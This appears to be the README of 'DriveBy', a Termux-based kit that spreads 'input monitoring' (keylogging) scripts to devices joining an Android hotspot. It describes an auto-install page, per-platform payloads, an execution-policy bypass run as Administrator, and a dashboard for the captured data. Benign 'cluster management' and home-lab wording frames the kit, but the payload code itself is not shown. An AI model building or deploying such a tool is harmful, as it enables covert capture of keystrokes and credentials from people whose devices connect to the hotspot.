# DriveBy - Home Network Cluster Management System

A phone-based system for automatically deploying input monitoring to devices connecting to your Android hotspot. Designed for managing your own devices in a controlled home lab environment.

## Quick Start

### 1. Setup (Android/Termux)
```bash
# Install Termux from F-Droid or Google Play
# Open Termux and run:
pkg update && pkg upgrade
pkg install python python-pip git
pip install -r requirements.txt
```

### 2. Run the System
```bash
# Start both services
python start.py

# Or check dependencies first
python start.py --check-only
```

### 3. Connect Devices
1. Enable hotspot on your Android phone
2. Connect target devices to the hotspot
3. On target devices, browse to: `http://192.168.43.1:8080`
4. Follow auto-installation instructions

## Features

- **Auto Device Detection** - Monitors hotspot connections
- **Web-Based Deployment** - Automatic script installation
- **Cross-Platform** - Windows, Linux, macOS, Android support
- **Real-Time Dashboard** - Monitor devices and data collection
- **Home Lab Focused** - Designed for authorized device management

## System Architecture

```
Android Phone (Host)
├── phone_host.py # Device detection & web server
├── data_server.py # Data collection & dashboard
└── Auto-deployment # Web interface for target devices

Target Devices
├── Windows # PowerShell monitoring script
├── Linux/Mac # Python monitoring script
└── Android # Termux monitoring script
```

## Web Interfaces

- **Auto-Install**: `http://[hotspot-ip]:8080` - Device setup page
- **Dashboard**: `http://[hotspot-ip]:8081/dashboard` - Data monitoring
- **Status**: `http://[hotspot-ip]:8080/status` - System status

## File Structure

```
DriveBy/
├── start.py # Easy launcher script
├── phone_host.py # Main host service
├── data_server.py # Data collection server
├── config.json # Configuration
├── requirements.txt # Dependencies
├── setup.md # Detailed setup guide
├── payloads/ # Device-specific scripts
│ ├── windows_monitor.ps1
│ ├── linux_monitor.py
│ └── android_monitor.py
├── web/
│ └── autorun.html # Auto-installation page
└── collected_data/ # Data storage
```

## Usage Examples

### Basic Usage
```bash
# Start full system
python start.py

# Check system health
python start.py --check-only

# Start only host service
python start.py --host-only
```

### Manual Device Setup
```bash
# Windows (as Administrator)
powershell -ExecutionPolicy Bypass -File cluster_monitor.ps1

# Linux/Mac
python3 cluster_monitor.py --server 192.168.43.1

# Android (in Termux)
python cluster_monitor.py --setup
```

## Configuration

Edit `config.json` to customize:

```json
{
 "server": {
 "port": 8080, # Web server port
 "data_port": 8081 # Data collection port
 },
 "network": {
 "scan_interval": 5, # Device scan frequency
 "hotspot_range": "192.168.43.0/24"
 }
}
```

## Security Notes

 **Important**: This system is designed for:
- Managing your own devices
- Home lab environments
- Educational purposes
- Authorized security testing

Ensure proper authorization before deployment on any device.

## Troubleshooting

### Common Issues

1. **Dependencies Missing**:
 ```bash
 pip install -r requirements.txt
 ```

2. **Permission Errors**:
 - Windows: Run PowerShell as Administrator
 - Linux/Mac: May need sudo for input access
 - Android: Grant Termux permissions

3. **Network Issues**:
 - Verify hotspot is enabled
 - Check IP addresses match configuration
 - Ensure firewall allows connections

### Debug Mode
```bash
# Enable verbose logging
python start.py --check-only # Check system health
```

## Requirements

- **Host**: Android device with Termux, Python 3.6+
- **Targets**: Windows (PowerShell 5.0+), Linux/Mac (Python 3.6+), Android (Termux)
- **Network**: Hotspot capability, local network access

## License

Educational and authorized use only. Users responsible for legal compliance.

---

**Need help?** Check `setup.md` for detailed instructions or review `TODO.md` for implementation status.
